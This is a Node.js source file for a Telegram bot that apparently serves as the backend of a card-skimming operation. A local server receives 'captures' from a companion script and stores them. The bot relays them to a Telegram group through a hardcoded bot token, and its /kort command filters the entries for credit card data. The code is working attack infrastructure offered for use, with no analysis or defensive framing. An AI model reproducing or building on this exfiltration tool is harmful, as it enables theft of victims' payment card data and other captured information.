/**
 * bot.js — ATP Bot
 * - Runs local server on port 3000 to receive captures from tg.js
 * - Saves to captures.json (persists across restarts)
 * - Commands in TG group: /kort [n]  /sidst  /antal  /slet
 */

const fs   = require("fs");
const http = require("http");

const BOT_TOKEN = "8925456907:AAH7p4LcEC2QpqhRN1S_FTDdTiaUzhcCWow";
const GROUP_ID  = "-5587558166";
const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
const DB_FILE   = __dirname + "/captures.json";

/* ── storage ──────────────────────────────────────────────────────── */
function loadDB()  { try { return JSON.parse(fs.readFileSync(DB_FILE,"utf8")); } catch { return []; } }
function saveDB(d) { fs.writeFileSync(DB_FILE, JSON.stringify(d, null, 2)); }

let captures = loadDB();
let offset   = 0;
console.log(`🗂  Loaded ${captures.length} capture(s) from disk`);

/* ── local HTTP server (receives captures from tg.js) ─────────────── */
http.createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }
    if (req.method === "POST" && req.url === "/capture") {
        let body = "";
        req.on("data", d => body += d);
        req.on("end", () => {
            try {
                const data = JSON.parse(body);
                const entry = {
                    date: new Date().toLocaleString("da-DK"),
                    text: data.text || JSON.stringify(data)
                };
                captures.push(entry);
                saveDB(captures);
                console.log(`[+] Capture #${captures.length} saved`);
                res.writeHead(200); res.end("ok");
            } catch(e) {
                res.writeHead(400); res.end("bad json");
            }
        });
    } else {
        res.writeHead(404); res.end();
    }
}).listen(3000, () => console.log("📡 Local server on http://localhost:3000"));

/* ── telegram API ─────────────────────────────────────────────────── */
async function api(method, body = {}) {
    const r = await fetch(`${API}/${method}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
    });
    return r.json();
}

async function sendChunked(chatId, entries, header) {
    if (!entries.length) {
        await api("sendMessage", { chat_id: chatId, text: "📭 No captures found." });
        return;
    }
    let chunk = header + "\n\n";
    for (const e of entries) {
        const block = `📋 [${e.date}]\n${e.text}\n${"─".repeat(30)}\n`;
        if ((chunk + block).length > 3800) {
            await api("sendMessage", { chat_id: chatId, text: chunk });
            chunk = "";
        }
        chunk += block;
    }
    if (chunk) await api("sendMessage", { chat_id: chatId, text: chunk });
}

/* ── telegram poll ────────────────────────────────────────────────── */
async function poll() {
    try {
        const res = await api("getUpdates", { offset, timeout: 30 });
        if (!res.ok) { await new Promise(r => setTimeout(r, 3000)); return; }

        for (const u of res.result || []) {
            offset = u.update_id + 1;
            const msg = u.message;
            if (!msg || !msg.text) continue;
            if (String(msg.chat.id) !== String(GROUP_ID)) continue;

            const text = msg.text.trim();

            if (text.startsWith("/kort")) {
                const limit = parseInt(text.split(" ")[1]) || 20;
                const ccOnly = captures.filter(e => hasCC(e.text));
                const shown  = ccOnly.slice(-limit);
                await sendChunked(GROUP_ID, shown,
                    `💳 ${shown.length} CC capture(s) of ${ccOnly.length} total (${captures.length} all):`);

            } else if (text === "/sidst") {
                const e = captures[captures.length - 1];
                if (!e) { await api("sendMessage", { chat_id: GROUP_ID, text: "📭 No captures yet." }); }
                else await api("sendMessage", { chat_id: GROUP_ID, text: `📋 Latest [${e.date}]:\n\n${e.text}` });

            } else if (text === "/antal") {
                await api("sendMessage", { chat_id: GROUP_ID, text: `📈 Total captures: ${captures.length}` });

            } else if (text === "/slet") {
                captures = [];
                saveDB(captures);
                await api("sendMessage", { chat_id: GROUP_ID, text: "🗑 All captures cleared." });
            }
        }
    } catch(e) {
        console.error("Poll error:", e.message);
        await new Promise(r => setTimeout(r, 3000));
    }
    setImmediate(poll);
}

console.log("🤖 Bot running — /kort  /sidst  /antal  /slet");
poll();
